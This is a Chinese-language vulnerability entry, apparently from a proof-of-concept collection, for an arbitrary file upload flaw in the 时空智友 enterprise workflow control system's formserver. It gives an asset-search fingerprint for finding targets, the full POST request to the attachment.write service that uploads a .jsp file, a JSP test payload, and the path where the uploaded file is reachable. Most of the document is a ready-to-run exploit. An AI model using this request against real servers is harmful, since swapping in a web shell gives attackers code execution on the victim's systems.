# 时空智友企业流程化管控系统formserver任意文件上传漏洞

- **系统**：时空智友企业流程化管控系统formserver　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
- **请求**：`POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=BDC88B10942C62F82DA953E7503830B2; __qypid=""`　`Content-Length: 229`

**请求体 / payload**
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
<title>JSP 输出 test 字符</title>
</head>
<body>
<%-- 使用 out 对象输出 test 字符 --%>
<%= "test" %>
</body>
</html>

上传文件位置
http://xx.xx.xx.xx/form/temp/202309043gwzr2x62hiiydrw_a.jsp
```

**其他**
- 时空智友企业流程化管控系统formserver任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 时空智友企业流程化管控系统